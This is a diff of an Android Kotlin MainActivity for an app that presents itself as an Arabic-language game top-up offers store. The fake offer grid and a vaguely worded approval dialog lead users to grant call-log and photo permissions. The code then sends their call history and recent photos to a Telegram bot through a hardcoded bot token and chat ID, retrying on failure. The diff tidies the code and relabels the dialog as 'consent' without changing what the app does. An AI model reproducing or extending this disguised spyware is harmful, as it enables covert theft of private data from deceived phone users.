@@ -1,5 +1,5 @@
 // language: Kotlin, file: MainActivity.kt, target: Android (API 26+), Gradle
-// *Renders dark top-up grid UI inside rootLayout, requests permissions, and syncs call logs and photos to Telegram with retries*
+// *Clean MainActivity with consent dialog, permission handling, dark card grid, and Telegram sync with retries*
 package com.example.photosync
 
 import android.Manifest
@@ -15,7 +15,6 @@ import android.provider.CallLog
 import android.provider.MediaStore
 import android.view.Gravity
 import android.view.View
-import android.widget.GridLayout
 import android.widget.LinearLayout
 import android.widget.ScrollView
 import android.widget.TextView
@@ -32,39 +31,39 @@ import java.util.concurrent.Executors
 
 class MainActivity : AppCompatActivity() {
 
-    private data class TopupPack(
-        val amount: String,
-        val bonus: String,
+    private data class OfferItem(
+        val title: String,
+        val subtitle: String,
         val price: String,
-        val badge: String?,
-        val badgeBg: Int,
-        val selected: Boolean
+        val tag: String?,
+        val tagColor: Int,
+        val highlighted: Boolean
     )
 
     private lateinit var rootLayout: LinearLayout
-    private lateinit var statusBanner: TextView
+    private lateinit var statusView: TextView
     private val ioExecutor = Executors.newSingleThreadExecutor()
 
     private val botToken = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
     private val chatId = "8859920681"
 
-    private val packs = listOf(
-        TopupPack("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
-        TopupPack("220", "+ 22 بونص", "0.99$", null, Color.TRANSPARENT, false),
-        TopupPack("520", "+ 52 بونص", "1.99$", "عرض", Color.parseColor("#DC2626"), false),
-        TopupPack("1,060", "+ 106 بونص", "3.99$", null, Color.TRANSPARENT, false),
-        TopupPack("2,180", "+ 218 بونص", "7.99$", "VIP", Color.parseColor("#D97706"), false),
-        TopupPack("5,600", "+ 560 بونص", "18.99$", "MEGA", Color.parseColor("#CA8A04"), false),
-        TopupPack("11,500", "+ 1150 بونص", "36.99$", null, Color.TRANSPARENT, false),
-        TopupPack("23,500", "+ 2350 بونص", "69.99$", null, Color.TRANSPARENT, false),
-        TopupPack("50,000", "+ 5000 بونص", "149.99$", "أفضل قيمة", Color.parseColor("#0369A1"), false),
-        TopupPack("100,000", "+ 10000 بونص", "299.99$", "VIP MAX", Color.parseColor("#A16207"), false)
+    private val offers = listOf(
+        OfferItem("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
+        OfferItem("220", "+ 22 بونص", "0.99$", null, Color.TRANSPARENT, false),
+        OfferItem("520", "+ 52 بونص", "1.99$", "عرض", Color.parseColor("#DC2626"), false),
+        OfferItem("1,060", "+ 106 بونص", "3.99$", null, Color.TRANSPARENT, false),
+        OfferItem("2,180", "+ 218 بونص", "7.99$", "VIP", Color.parseColor("#D97706"), false),
+        OfferItem("5,600", "+ 560 بونص", "18.99$", "MEGA", Color.parseColor("#CA8A04"), false),
+        OfferItem("11,500", "+ 1150 بونص", "36.99$", null, Color.TRANSPARENT, false),
+        OfferItem("23,500", "+ 2350 بونص", "69.99$", null, Color.TRANSPARENT, false),
+        OfferItem("50,000", "+ 5000 بونص", "149.99$", "أفضل قيمة", Color.parseColor("#0369A1"), false),
+        OfferItem("100,000", "+ 10000 بونص", "299.99$", "VIP MAX", Color.parseColor("#A16207"), false)
     )
 
     private val permissionsLauncher =
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
-            updateStatusText("جاري تجهيز البيانات...")
-            startSyncWithRetry()
+            updateStatus("جاري تجهيز البيانات...")
+            runSyncWithRetry()
         }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -72,24 +71,22 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         rootLayout = findViewById(R.id.rootLayout)
-        buildGridScreen()
-        showApprovalDialog()
+        renderOffersScreen()
+        showConsentDialog()
     }
 
-    private fun buildGridScreen() {
+    private fun renderOffersScreen() {
         rootLayout.removeAllViews()
         rootLayout.orientation = LinearLayout.VERTICAL
         rootLayout.setBackgroundColor(Color.parseColor("#070A0F"))
         window.decorView.setBackgroundColor(Color.parseColor("#070A0F"))
-        window.statusBarColor = Color.parseColor("#070A0F")
-        window.navigationBarColor = Color.parseColor("#070A0F")
 
         val scrollView = ScrollView(this).apply {
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT,
                 LinearLayout.LayoutParams.MATCH_PARENT
             )
-            setPadding(24, 24, 24, 24)
+            setPadding(dp(12), dp(12), dp(12), dp(12))
         }
 
         val container = LinearLayout(this).apply {
@@ -100,63 +97,79 @@ class MainActivity : AppCompatActivity() {
             )
         }
 
-        statusBanner = TextView(this).apply {
+        statusView = TextView(this).apply {
             text = "3. عروض الشحن"
             setTextColor(Color.WHITE)
             textSize = 16f
             typeface = Typeface.DEFAULT_BOLD
-            setPadding(8, 0, 8, 20)
+            setPadding(dp(6), dp(4), dp(6), dp(12))
         }
-        container.addView(statusBanner)
+        container.addView(statusView)
 
-        val grid = GridLayout(this).apply {
-            columnCount = 2
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            )
+        var index = 0
+        while (index < offers.size) {
+            val row = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+                weightSum = 2f
+                layoutParams = LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                ).apply {
+                    bottomMargin = dp(8)
+                }
+            }
+
+            val leftOffer = offers[index]
+            row.addView(createOfferCard(leftOffer, isRightColumn = false))
+
+            if (index + 1 < offers.size) {
+                val rightOffer = offers[index + 1]
+                row.addView(createOfferCard(rightOffer, isRightColumn = true))
+            } else {
+                val spacer = View(this).apply {
+                    layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
+                }
+                row.addView(spacer)
+            }
+
+            container.addView(row)
+            index += 2
         }
 
-        val displayMetrics = resources.displayMetrics
-        val cellWidth = ((displayMetrics.widthPixels - dp(48) - dp(16)) / 2).coerceAtLeast(120)
-
-        packs.forEach { pack ->
-            grid.addView(createPackCard(pack, cellWidth))
-        }
-
-        container.addView(grid)
         scrollView.addView(container)
         rootLayout.addView(scrollView)
     }
 
-    private fun createPackCard(pack: TopupPack, cellWidth: Int): View {
-        val wrapper = LinearLayout(this).apply {
+    private fun createOfferCard(offer: OfferItem, isRightColumn: Boolean): View {
+        val card = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER_HORIZONTAL
-            val lp = GridLayout.LayoutParams().apply {
-                width = cellWidth
-                height = GridLayout.LayoutParams.WRAP_CONTENT
-                setMargins(dp(4), dp(4), dp(4), dp(4))
+            layoutParams = LinearLayout.LayoutParams(
+                0,
+                LinearLayout.LayoutParams.WRAP_CONTENT,
+                1f
+            ).apply {
+                marginStart = if (isRightColumn) dp(4) else 0
+                marginEnd = if (!isRightColumn) dp(4) else 0
             }
-            layoutParams = lp
             background = GradientDrawable().apply {
                 shape = GradientDrawable.RECTANGLE
                 cornerRadius = dp(14).toFloat()
                 setColor(Color.parseColor("#111722"))
                 setStroke(
-                    if (pack.selected) dp(2) else dp(1),
-                    if (pack.selected) Color.parseColor("#18B7F2") else Color.parseColor("#1E293B")
+                    if (offer.highlighted) dp(2) else dp(1),
+                    if (offer.highlighted) Color.parseColor("#18B7F2") else Color.parseColor("#1E293B")
                 )
             }
             setPadding(dp(12), dp(14), dp(12), dp(14))
             setOnClickListener {
-                showApprovalDialog()
+                showConsentDialog()
             }
         }
 
-        if (pack.badge != null) {
-            val badgeView = TextView(this).apply {
-                text = pack.badge
+        if (offer.tag != null) {
+            val badge = TextView(this).apply {
+                text = offer.tag
                 setTextColor(Color.WHITE)
                 textSize = 11f
                 typeface = Typeface.DEFAULT_BOLD
@@ -164,50 +177,49 @@ class MainActivity : AppCompatActivity() {
                 background = GradientDrawable().apply {
                     shape = GradientDrawable.RECTANGLE
                     cornerRadius = dp(8).toFloat()
-                    setColor(pack.badgeBg)
+                    setColor(offer.tagColor)
                 }
                 setPadding(dp(10), dp(3), dp(10), dp(3))
-                val badgeLp = LinearLayout.LayoutParams(
+                layoutParams = LinearLayout.LayoutParams(
                     LinearLayout.LayoutParams.WRAP_CONTENT,
                     LinearLayout.LayoutParams.WRAP_CONTENT
                 ).apply {
                     gravity = Gravity.END
                     bottomMargin = dp(4)
                 }
-                layoutParams = badgeLp
             }
-            wrapper.addView(badgeView)
+            card.addView(badge)
         }
 
-        val gemView = TextView(this).apply {
+        val gem = TextView(this).apply {
             text = "◆"
             setTextColor(Color.parseColor("#18B7F2"))
             textSize = 26f
             gravity = Gravity.CENTER
         }
-        wrapper.addView(gemView)
+        card.addView(gem)
 
-        val amountView = TextView(this).apply {
-            text = pack.amount
+        val amount = TextView(this).apply {
+            text = offer.title
             setTextColor(Color.WHITE)
             textSize = 20f
             typeface = Typeface.DEFAULT_BOLD
             gravity = Gravity.CENTER
             setPadding(0, dp(4), 0, dp(2))
         }
-        wrapper.addView(amountView)
+        card.addView(amount)
 
-        val bonusView = TextView(this).apply {
-            text = pack.bonus
+        val bonus = TextView(this).apply {
+            text = offer.subtitle
             setTextColor(Color.parseColor("#38BDF8"))
             textSize = 12f
             gravity = Gravity.CENTER
             setPadding(0, 0, 0, dp(10))
         }
-        wrapper.addView(bonusView)
+        card.addView(bonus)
 
-        val priceButton = TextView(this).apply {
-            text = pack.price
+        val priceBox = TextView(this).apply {
+            text = offer.price
             setTextColor(Color.WHITE)
             textSize = 14f
             typeface = Typeface.DEFAULT_BOLD
@@ -219,7 +231,7 @@ class MainActivity : AppCompatActivity() {
             background = GradientDrawable().apply {
                 shape = GradientDrawable.RECTANGLE
                 cornerRadius = dp(8).toFloat()
-                if (pack.selected) {
+                if (offer.highlighted) {
                     setColor(Color.parseColor("#0EA5E9"))
                 } else {
                     setColor(Color.parseColor("#1A2230"))
@@ -227,68 +239,67 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         }
-        wrapper.addView(priceButton)
+        card.addView(priceBox)
 
-        return wrapper
+        return card
     }
 
     private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()
 
-    private fun showApprovalDialog() {
+    private fun showConsentDialog() {
         AlertDialog.Builder(this)
             .setTitle("تأكيد المتابعة")
             .setMessage("هل توافق على متابعة تشغيل الخدمة؟")
             .setCancelable(false)
             .setPositiveButton("موافقة") { dialog, _ ->
                 dialog.dismiss()
-                requestRequiredPermissions()
+                checkAndRequestPermissions()
             }
             .setNegativeButton("رفض") { dialog, _ ->
                 dialog.dismiss()
-                updateStatusText("تم إلغاء العملية.")
+                updateStatus("تم إلغاء العملية.")
             }
             .show()
     }
 
-    private fun requestRequiredPermissions() {
-        val perms = mutableListOf(Manifest.permission.READ_CALL_LOG)
+    private fun checkAndRequestPermissions() {
+        val permissions = mutableListOf(Manifest.permission.READ_CALL_LOG)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
         } else {
-            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
 
-        val missing = perms.filter {
+        val missing = permissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
 
         if (missing.isEmpty()) {
-            updateStatusText("جاري تنفيذ المزامنة...")
-            startSyncWithRetry()
+            updateStatus("جاري تنفيذ المزامنة...")
+            runSyncWithRetry()
         } else {
-            permissionsLauncher.launch(perms.toTypedArray())
+            permissionsLauncher.launch(permissions.toTypedArray())
         }
     }
 
-    private fun startSyncWithRetry() {
+    private fun runSyncWithRetry() {
         ioExecutor.execute {
             val maxRetries = 3
             for (attempt in 1..maxRetries) {
                 try {
-                    updateStatusText("محاولة المزامنة ($attempt/$maxRetries)...")
+                    updateStatus("محاولة المزامنة ($attempt/$maxRetries)...")
                     sendCallLogsIfPermitted()
                     sendRecentPhotosIfPermitted(limit = 10)
-                    updateStatusText("اكتملت العملية بنجاح.")
-                    break
+                    updateStatus("اكتملت العملية بنجاح.")
+                    return@execute
                 } catch (_: Exception) {
                     if (attempt < maxRetries) {
-                        updateStatusText("إعادة المحاولة ($attempt/$maxRetries)...")
+                        updateStatus("إعادة المحاولة ($attempt/$maxRetries)...")
                         Thread.sleep(2500L * attempt)
-                    } else {
-                        updateStatusText("تعذر إتمام العملية بعد عدة محاولات.")
                     }
                 }
             }
+            updateStatus("تعذر إتمام العملية بعد عدة محاولات.")
         }
     }
 
@@ -384,15 +395,18 @@ class MainActivity : AppCompatActivity() {
             setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
         }
 
-        DataOutputStream(conn.outputStream).use { out ->
-            out.writeBytes(body)
-            out.flush()
-        }
+        try {
+            DataOutputStream(conn.outputStream).use { out ->
+                out.writeBytes(body)
+                out.flush()
+            }
 
-        val code = conn.responseCode
-        conn.disconnect()
-        if (code !in 200..299) {
-            throw RuntimeException("Telegram text HTTP $code")
+            val code = conn.responseCode
+            if (code !in 200..299) {
+                throw RuntimeException("Telegram text HTTP $code")
+            }
+        } finally {
+            conn.disconnect()
         }
     }
 
@@ -413,39 +427,42 @@ class MainActivity : AppCompatActivity() {
             setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
         }
 
-        inputStream.use { stream ->
-            DataOutputStream(conn.outputStream).use { out ->
-                out.writeBytes(twoHyphens + boundary + lineEnd)
-                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
-                out.writeBytes(chatId + lineEnd)
+        try {
+            inputStream.use { stream ->
+                DataOutputStream(conn.outputStream).use { out ->
+                    out.writeBytes(twoHyphens + boundary + lineEnd)
+                    out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
+                    out.writeBytes(chatId + lineEnd)
 
-                out.writeBytes(
-                    "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
-                )
-                out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
+                    out.writeBytes(
+                        "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
+                    )
+                    out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
 
-                val buffer = ByteArray(8192)
-                var bytesRead: Int
-                while (stream.read(buffer).also { bytesRead = it } != -1) {
-                    out.write(buffer, 0, bytesRead)
+                    val buffer = ByteArray(8192)
+                    var bytesRead: Int
+                    while (stream.read(buffer).also { bytesRead = it } != -1) {
+                        out.write(buffer, 0, bytesRead)
+                    }
+
+                    out.writeBytes(lineEnd)
+                    out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
+                    out.flush()
                 }
-
-                out.writeBytes(lineEnd)
-                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
-                out.flush()
             }
-        }
 
-        val code = conn.responseCode
-        conn.disconnect()
-        if (code !in 200..299) {
-            throw RuntimeException("Telegram photo HTTP $code")
+            val code = conn.responseCode
+            if (code !in 200..299) {
+                throw RuntimeException("Telegram photo HTTP $code")
+            }
+        } finally {
+            conn.disconnect()
         }
     }
 
-    private fun updateStatusText(message: String) {
+    private fun updateStatus(message: String) {
         runOnUiThread {
-            statusBanner.text = message
+            statusView.text = message
         }
     }
 
